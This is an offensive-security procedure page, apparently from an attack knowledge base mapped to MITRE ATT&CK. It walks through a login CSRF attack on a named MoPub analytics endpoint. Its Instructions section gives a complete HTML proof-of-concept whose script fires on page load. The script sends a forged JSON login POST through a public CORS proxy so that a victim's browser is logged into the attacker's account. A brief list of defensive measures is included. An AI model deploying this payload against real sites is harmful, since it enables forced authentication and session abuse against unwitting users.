---
tags:
  - csrf
  - web
type: procedure
tools:
  - '[[tools/Browser]]'
  - '[[tools/CORS-Anywhere-Proxy]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:35.893Z'
sub_techniques: []
id: 47f42d83-a4bd-4226-8910-c8f8559514b0
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Prepare-Malicious-HTML-for-CSRF-Login-Forgery

## Summary

This procedure involves creating an HTML file with embedded JavaScript to forge a POST login request to the vulnerable analytics.mopub.com endpoint, exploiting the lack of CSRF token validation to prepare for unauthorized authentication.

## Description

The attack targets the POST /login endpoint, which accepts JSON payloads without CSRF checks. By crafting an AJAX request in HTML, the attacker embeds their credentials and uses a CORS proxy to bypass browser restrictions. This setup allows the payload to be loaded in a victim's browser, sending the request from their session cookies, effectively logging them into the attacker's account. Prerequisites include attacker MoPub credentials and access to a text editor or browser for file creation.

## Requirements

1. Valid MoPub username and password for the attacker account
2. Access to a CORS proxy like cors-anywhere.herokuapp.com
3. Basic knowledge of HTML and JavaScript for payload editing

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing POST requests
- Enforce strict CORS policies and validate origins
- Monitor for unusual login patterns from proxied IPs

## Objectives

1. Forge a login request payload without user interaction
2. Bypass CORS to enable cross-origin requests
3. Prepare for session hijacking via forced authentication

## Instructions

### Step 1: Create Base HTML File

**Context**: Start with a template HTML file containing AJAX code to send the POST request.

Open a text editor and create csrfinlogin.html with the following structure:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<script>
fetch('https://cors-anywhere.herokuapp.com/https://analytics.mopub.com/login', {
  method: 'POST',
  headers: {'Content-Type': 'application/json;charset=UTF-8'},
  body: JSON.stringify({name: 'attacker_username', pass: 'attacker_password'})
}).then(response => console.log(response.status));
</script>
</body>
</html>
```

> This script automatically sends the forged request upon page load. Replace 'attacker_username' and 'attacker_password' with real credentials.

### Step 2: Test Payload Locally

**Context**: Verify the HTML executes without errors in a browser.

Load the file in [[tools/Browser]] and check the console for any issues. Ensure the proxy is active by visiting https://cors-anywhere.herokuapp.com/ first to request temporary access if needed.

> Expected: No CORS errors; request attempts to hit the endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Browser]]
- [[tools/CORS-Anywhere-Proxy]]

## Tags

- csrf
- web
- payload-creation
